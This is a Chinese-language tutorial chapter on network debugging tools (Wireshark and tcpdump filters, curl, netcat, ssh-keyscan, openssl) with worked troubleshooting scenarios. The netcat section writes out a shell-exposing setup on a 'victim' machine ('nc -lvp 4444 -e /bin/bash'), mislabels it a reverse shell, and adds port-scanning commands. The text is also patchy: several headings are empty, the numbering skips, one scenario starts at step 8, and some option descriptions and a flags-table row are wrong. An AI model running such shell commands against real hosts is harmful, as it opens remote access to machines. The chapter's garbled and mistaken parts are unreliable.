#### 2.1.2 捕获过滤器

捕获过滤器在抓包前设置，决定哪些数据包被捕获。使用 BPF (Berkeley Packet Filter) 语法。

**基本语法**：

```
┌────────────────────────────────────────────────────────────┐
│                    捕获过滤器语法                           │
├────────────────────────────────────────────────────────────┤
│  primitives (原语):                                         │
│    [not] direction proto [host | port]                     │
│                                                            │
│  direction (方向):                                         │
│    src | dst | src or dst | src and dst                    │
│                                                            │
│  proto (协议):                                             │
│    tcp | udp | icmp | ip | arp | ether                     │
│                                                            │
│  host (主机):                                              │
│    host 192.168.1.1                                        │
│                                                            │
│  port (端口):                                              │
│    port 80 | port 443                                      │
└────────────────────────────────────────────────────────────┘
```

**常用示例**：

```bash
# 捕获特定主机的流量
host 192.168.1.100

# 捕获特定端口流量
port 80              # HTTP
port 443             # HTTPS
port 22              # SSH

# 捕获特定协议的流量
tcp
udp
icmp

# 组合条件
src host 192.168.1.1 and dst port 80   # 源IP为192.168.1.1到80端口
tcp and port 443                       # HTTPS流量
not arp and not icmp                   # 排除ARP和ICMP

# 捕获网络范围
net 192.168.0.0/24

# 捕获多个条件
tcp port 80 or tcp port 443            # HTTP或HTTPS
```

**Wireshark GUI 中设置捕获过滤器**：
- 在开始捕获界面输入捕获过滤器表达式
- 或通过菜单 `Capture -> Options` 设置

### 2.2 tcpdump 命令

tcpdump 是 Linux/Unix 下的命令行抓包工具，适合服务器环境和无图形界面的场景。

#### 2.2.1 基本用法

```bash
# 查看可用网络接口
tcpdump -D

# 输出示例：
# 1.eth0 [Up, Running, Connected]
# 2.any (Pseudo-device that captures on all interfaces) [Up, Running]
# 3.lo [Up, Running, Connected]
```

```bash
# 捕获所有数据包（按 Ctrl+C 停止）
tcpdump

# 捕获特定接口的数据包
tcpdump -i eth0

# 捕获指定数量数据包后停止
tcpdump -i eth0 -c 100

# 捕获并保存到文件（使用 -w 选项）
tcpdump -i eth0 -w capture.pcap

# 读取保存的抓包文件
tcpdump -r capture.pcap

# 显示更多详情（verbose模式）
tcpdump -i eth0 -v

# 显示最多详情（very verbose）
tcpdump -i eth0 -vv
```

#### 2.2.2 过滤器语法

tcpdump 使用与 Wireshark 相同的 BPF 语法：

```bash
# 按主机过滤
tcpdump -i eth0 host 192.168.1.100
tcpdump -i eth0 src host 192.168.1.100    # 源主机
tcpdump -i eth0 dst host 8.8.8.8          # 目标主机

# 按端口过滤
tcpdump -i eth0 port 80         # 端口80
tcpdump -i eth0 port 443        # 端口443
tcpdump -i eth0 src port 8080  # 源端口8080

# 按协议过滤
tcpdump -i eth0 tcp
tcpdump -i eth0 udp
tcpdump -i eth0 icmp
tcpdump -i eth0 arp

# 组合条件
tcpdump -i eth0 host 192.168.1.100 and port 80
tcpdump -i eth0 'tcp port 80 or tcp port 443'
tcpdump -i eth0 'src host 192.168.1.1 and not dst host 192.168.1.2'

# 按网络过滤
tcpdump -i eth0 net 192.168.0.0/24
tcpdump -i eth0 'src net 10.0.0.0/8 and dst net 172.16.0.0/12'
```

#### 2.2.3 输出格式详解

```
tcpdump 默认输出格式：
[timestamp] [protocol] [src ip].[src port] > [dst ip].[dst port]: [flags] [seq] [ack] [win] [options]

tcpdump 典型输出示例：
─────────────────────────────────────────────────────────────────────

# TCP 连接（SYN）
14:30:25.123456 IP 192.168.1.100.54321 > 93.184.216.34.443: Flags [S], 
    seq 1234567890, win 65535, options [mss 1460,nop,wscale 6], length 0

# TCP 连接（SYN-ACK）
14:30:25.125678 IP 93.184.216.34.443 > 192.168.1.100.54321: Flags [S.], 
    seq 9876543210, ack 1234567891, win 65535, options [mss 1460], length 0

# TCP 数据传输
14:30:25.130000 IP 192.168.1.100.54321 > 93.184.216.34.443: Flags [P.], 
    seq 1234567891:1234568900, ack 9876543211, length 909

# DNS 查询
14:30:26.100000 IP 192.168.1.100.54321 > 8.8.8.8.53: 
    12345+ A? www.example.com. (30)

# DNS 响应
14:30:26.150000 IP 8.8.8.8.53 > 192.168.1.100.54321: 
    12345 qr rd ra a 93.184.216.34 (46)
```

**Flags 含义**：

| Flag | 含义 | 说明 |
|------|------|------|
| S | SYN | 连接建立开始 |
| . | ACK | 确认包 |
| F | FIN | 连接关闭（正常） |
| P | PSH | 推送数据 |
| R | RST | 连接重置 |
| S. | SYN-ACK | 同步+确认 |
| F. | FIN-ACK | 结束+确认 |
| P. | PUSH-ACK | 推送+确认 |
| [ ] | SYN+EWO... | 包含多种flags |

#### 2.2.4 高级用法

```bash
# 保存为 pcap 格式（可在 Wireshark 中打开）
tcpdump -i eth0 -w output.pcap

# 读取 pcap 文件并应用过滤器
tcpdump -r capture.pcap 'tcp port 80 and host 192.168.1.100'

# 不解析域名（显示IP而非主机名）
tcpdump -i eth0 -n

# 不解析端口（显示数字而非服务名）
tcpdump -i eth0 -nn

# 显示完整数据包内容
tcpdump -i eth0 -X            # Hex 和 ASCII
tcpdump -i eth0 -XX           # 包含Ethernet头部

# 抓取特定用户的数据（Linux特定）
tcpdump -i eth0 -Z root

# 轮转日志文件
tcpdump -i eth0 -W 5 -C 10 -w /tmp/capture_%H.pcap
# -W 5: 最多5个文件
# -C 10: 每个文件最大10MB

# 表达式组合
tcpdump -i eth0 '(
    (ip[2:2] - ((ip[0]&0xf)<<2)) - 
    ((tcp[12]&0xf0)>>4)*4
) > 0 and tcp[tcpflags] & tcp-ack != 0'
```

#### 2.2.5 实战示例

```bash
# 调试 HTTP 请求
sudo tcpdump -i eth0 -n 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>4)*4) > 0)' -A

# 输出示例：
# 14:30:25.123456 IP 192.168.1.100.54321 > 93.184.216.34.80: Flags [P.], 
#     seq 1:100, ack 1, win 502, length 99
# E..<..@.@. ............GET /api/users HTTP/1.1
# Host: api.example.com
# User-Agent: curl/7.68.0
# Accept: */*
#

# 监控 TCP 连接建立过程
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'

# 检测可疑的外部连接
sudo tcpdump -i eth0 -n 'ip[19] != 0'    # 监控源路由
sudo tcpdump -i eth0 -n 'tcp[13] & 16 != 0'  # 监控URG标志
```

## 3. 网络调试工具

### 3.1 curl 命令

curl 是强大的命令行 HTTP 客户端，支持多种协议，是调试 API 的利器。

#### 3.1.1 基本用法

```bash
# 基本 GET 请求
curl https://api.example.com/users

# 显示响应头
curl -i https://api.example.com/users

# 只显示响应头
curl -I https://api.example.com/users
# 或
curl --head https://api.example.com/users

# 保存到文件
curl -o response.json https://api.example.com/users
curl -O https://api.example.com/users/data.json  # 使用远程文件名

# 跟随重定向
curl -L https://short.url/abc123
```

#### 3.1.2 HTTP 方法

```bash
# GET (默认)
curl https://api.example.com/users

# POST
curl -X POST https://api.example.com/users \
  -d '{"name": "张三", "email": "zhangsan@example.com"}'

# PUT
curl -X PUT https://api.example.com/users/123 \
  -d '{"name": "李四", "email": "lisi@example.com"}'

# PATCH
curl -X PATCH https://api.example.com/users/123 \
  -d '{"name": "王五"}'

# DELETE
curl -X DELETE https://api.example.com/users/123

# HEAD (只获取头部)
curl -I https://api.example.com/users
```

#### 3.1.3 请求头设置

```bash
# 自定义 User-Agent
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  https://api.example.com

# 添加额外头
curl -H "Authorization: Bearer token123" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  https://api.example.com/users

# 移除默认头
curl -H "Accept:" https://api.example.com  # 移除Accept头

# 引用 (Referer)
curl -e "https://google.com" https://api.example.com

# Cookie
curl -b "session=abc123" https://api.example.com
curl -c cookies.txt https://api.example.com    # 保存cookie到文件
curl -b cookies.txt https://api.example.com    # 使用cookie文件
```

#### 3.1.4 请求体与表单

```bash
# JSON 数据
curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -d '{"name": "张三", "email": "zhangsan@example.com"}'

# 多行 JSON
curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -d '{
    "name": "张三",
    "email": "zhangsan@example.com",
    "age": 25
  }'

# URL 编码表单
curl -X POST https://api.example.com/login \
  -d "username=admin&password=secret"

# Multipart 表单 (文件上传)
curl -F "file=@/path/to/image.png" \
  -F "description=My image" \
  https://api.example.com/upload

# 表单带额外字段
curl -F "username=admin" \
  -F "password=secret" \
  https://api.example.com/login
```

#### 3.1.5 认证

```bash
# Basic Auth
curl -u username:password https://api.example.com/users

# Bearer Token
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..." \
  https://api.example.com/users

# API Key (通常放在 Header 或 Query)
curl -H "X-API-Key: your-api-key" https://api.example.com/data

# Digest Auth
curl --digest -u username:password https://api.example.com/protected

# NTLM (Windows)
curl --ntlm -u username:password https://api.example.com/data
```

#### 3.1.6 代理与连接

```bash
# 使用代理
curl -x http://proxy.example.com:8080 https://api.example.com

# SOCKS5 代理
curl -x socks5://127.0.0.1:1080 https://api.example.com

# 跳过证书验证 (HTTPS)
curl -k https://api.example.com  # 测试环境使用
curl --insecure https://api.example.com

# 指定 CA 证书
curl --cacert /path/to/ca-cert.pem https://api.example.com

# 指定 DNS
curl --resolve "api.example.com:443:10.0.0.1" https://api.example.com

# 超时设置
curl -m 10 https://api.example.com      # 10秒超时
curl --connect-timeout 5 -m 10 \        # 连接5秒，總超时10秒
  https://api.example.com
```

#### 3.1.7 输出控制

```bash
# 静默模式 (不显示进度)
curl -s https://api.example.com/users

# 详细模式
curl -v https://api.example.com/users   # 显示请求头
curl --verbose https://api.example.com   # 同上

# 更详细 (显示整个过程)
curl --trace - https://api.example.com

# 格式化 JSON 输出 (结合 jq)
curl -s https://api.example.com/users | jq

# 同时显示请求和响应

```

#### 3.1.8 实战示例


### 3.2 netcat (nc)

netcat 是网络工具中的瑞士军刀，用于 TCP/UDP 连接、端口扫描、传输文件等。

#### 3.2.1 基本连接

```bash
# 连接到一个 TCP 端口
nc -nv 192.168.1.100 80

# 连接到一个 UDP 端口
nc -nuv 192.168.1.100 53

# 连接并发送数据
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80

# 连接并交互
nc -nv 192.168.1.100 22
```

#### 3.2.2 端口扫描

```bash
# 扫描单个端口
nc -zv 192.168.1.100 80

# 扫描多个端口
nc -zv 192.168.1.100 22 80 443

# 扫描端口范围
nc -zv 192.168.1.100 1-1000

# 端口扫描并显示详细信息
nc -zvn 192.168.1.100 1-1000 2>&1 | grep -E "succeeded|open"

# UDP 端口扫描
nc -zvn -u 192.168.1.100 53 123 161
```

#### 3.2.3 监听模式

```bash
# 监听 TCP 端口
nc -lvp 4444

# 监听 UDP 端口
nc -luvp 4444

# 指定监听地址
nc -lvp 4444 0.0.0.0

# 监听并接收文件
nc -lvp 4444 > received.txt

# 监听并执行命令 (反向 shell, 仅供学习)
# 受害者机器:
nc -lvp 4444 -e /bin/bash
# 攻击者机器:
nc 受害者IP 4444
```

#### 3.2.4 文件传输

```bash
# 发送文件
# 机器 A (发送方):
nc -lvp 4444 < file.txt
# 或
cat file.txt | nc -lvp 4444

# 机器 B (接收方):
nc A的IP 4444 > received.txt

# 快速文件传输
# 发送方:
nc -lvp 4444 < backup.tar.gz
# 接收方:
nc -N 发送方IP 4444 > backup.tar.gz

# 使用管道压缩传输
tar czf - /data | nc -lvp 4444
nc -N 接收方IP 4444 | tar xzf - -C /destination
```

#### 3.2.5 网络诊断

```bash
# 测试端口连通性
nc -zv example.com 80
# 输出: Connection to example.com 80 port [tcp/http] succeeded!

# 测试网络延迟
time echo "test" | nc -q 1 example.com 80

# 获取 banner
nc example.com 80
GET / HTTP/1.1
Host: example.com

# 检查端口是否被占用
nc -lvp 8080
# 如果失败: Address already in use

# 保持连接存活
nc -k -lvp 4444

# 设置超时
nc -w 3 -zv example.com 80
```

#### 3.2.6 代理与隧道

```bash
# 通过 HTTP 代理连接
nc -X connect -x proxy.example.com:8080 target.example.com 443

# 创建简单代理
# 在网关机器上:
nc -lvp 8080 -c "nc target.example.com 80"

# 端口转发
mkfifo /tmp/fifo
nc -lvp 8080 < /tmp/fifo | nc target.example.com 80 > /tmp/fifo
```


#### 3.4.2 HTTPS 请求测试

#### 3.4.3 TLS 版本控制

### 4.3 ssh-keyscan (SSH 指纹)

ssh-keyscan 用于获取远程 SSH 服务器的公钥指纹，用于验证服务器真实性。

#### 4.3.1 基本用法

```bash
# 获取 SSH 服务器公钥
ssh-keyscan example.com

# 获取多个服务器
ssh-keyscan -t rsa,ecdsa,ed25519 example.com

# 指定端口
ssh-keyscan -p 2222 example.com

# 输出到文件
ssh-keyscan example.com >> known_hosts

# 增量添加
ssh-keyscan -t rsa example.com >> ~/.ssh/known_hosts
```

#### 4.3.2 主机密钥管理

```bash
# 获取并添加指纹到 known_hosts
ssh-keyscan -H example.com >> ~/.ssh/known_hosts

# 获取 MD5 指纹 (兼容旧版本)
ssh-keyscan -t rsa,ecdsa,ed25519 -H example.com

# 检查已知主机
ssh-keygen -F example.com

# 从 known_hosts 中删除
ssh-keygen -R example.com

# 显示指纹
ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub
```

#### 4.3.3 指纹验证示例

```bash
# 1. 首次连接前获取指纹
$ ssh-keyscan example.com
# example.com SSH-2.0-OpenSSH_8.9
# example.com ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTY...
# example.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...

# 2. 验证指纹 (通过安全渠道确认)
# 可联系管理员确认指纹

# 3. 添加到 known_hosts
ssh-keyscan example.com >> ~/.ssh/known_hosts

# 4. 现在可以安全连接
ssh user@example.com

# 5. 查看连接的指纹
ssh -o FingerprintHash=MD5 user@example.com
# 或者查看 known_hosts 中的指纹
ssh-keygen -lf ~/.ssh/known_hosts | grep example.com
```

## 5. 工程示例：实际调试场景

### 5.1 场景一：HTTP API 调试

**问题**：用户反馈登录接口返回 401 错误

**调试步骤**：

```bash
# 1. 首先用 curl 测试登录接口
curl -v -X POST https://api.example.com/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "wrongpass"}'

# 响应：
# HTTP/1.1 401 Unauthorized
# {"error": "Invalid credentials"}

# 2. 测试正确密码
curl -s -X POST https://api.example.com/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "correctpass"}' | jq

# 响应：
# {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", "expires_in": 3600}

# 3. 用获取的 token 访问受保护的接口
curl -s -X GET https://api.example.com/api/users \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | jq

# 4. Wireshark 抓包分析
#    过滤器: http.request.method == "POST" && http.host == "api.example.com"
```

**结果**：问题原因 - 用户使用了错误的密码

### 5.2 场景二：HTTPS 证书问题

**问题**：客户端报告 HTTPS 连接失败，SSL handshake error

**调试步骤**：

```bash
# 1. 检查 SSL 连接
openssl s_client -connect api.example.com:443 -showcerts

# 2. 检查证书详情
echo | openssl s_client -connect api.example.com:443 2>/dev/null | \
  openssl x509 -noout -dates -issuer -subject

# 输出示例：
# notBefore=May 15 00:00:00 2024 GMT
# notAfter=Jun 15 23:59:59 2024 GMT
# issuer=C = US, O = Let's Encrypt, CN = R3
# subject=CN = api.example.com

# 3. 检查 SNI
openssl s_client -connect api.example.com:443 -servername api.example.com

# 4. 检查证书链
openssl s_client -connect api.example.com:443 -showcerts 2>/dev/null | \
  openssl x509 -noout -text | grep -A 5 "Certificate chain"

# 5. 检查支持的 TLS 版本
openssl s_client -connect api.example.com:443 -tls1_2
openssl s_client -connect api.example.com:443 -tls1_3

# 6. 检查 cipher suites
openssl s_client -connect api.example.com:443 -cipher 'ECDHE-RSA-AES128-GCM-SHA256'
```

**可能原因**：
- 证书过期
- 主机名不匹配 (hostname mismatch)
- 证书链不完整
- 客户端不支持服务器要求的 TLS 版本/cipher

### 5.3 场景三：DNS 解析问题

**问题**：域名解析正常但访问不到服务

**调试步骤**：

```bash
dig api.example.com CNAME

# 8. Wireshark 抓包
#    过滤器: dns || (ip.addr == 8.8.8.8 && tcp.port == 443)
```

## 6. 总结

本章介绍了常用的协议调试工具：

| 类别 | 工具 | 适用场景 |
|------|------|----------|
| **抓包工具** | Wireshark | 深度协议分析、问题定位 |
| | tcpdump | 服务器抓包、无界面环境 |
| | Charles | HTTP/HTTPS 调试、接口测试 |
| | Fiddler | Windows 平台 HTTP 调试 |
| **网络调试** | curl | API 测试、HTTP 请求 |
| | netcat | 端口扫描、连接测试、文件传输 |
| | telnet | TCP 连接测试、协议调试 |
| | openssl s_client | TLS/HTTPS 调试、证书验证 |
| **DNS** | dig | DNS 查询、域名验证 |
| | nslookup | 基础 DNS 测试 |
| **扫描** | nmap | 端口扫描、服务发现 |
| **SSH** | ssh-keyscan | SSH 指纹获取、 known_hosts 管理 |

掌握这些工具，可以应对大多数网络协议调试场景。关键是根据具体问题选择合适的工具组合使用。
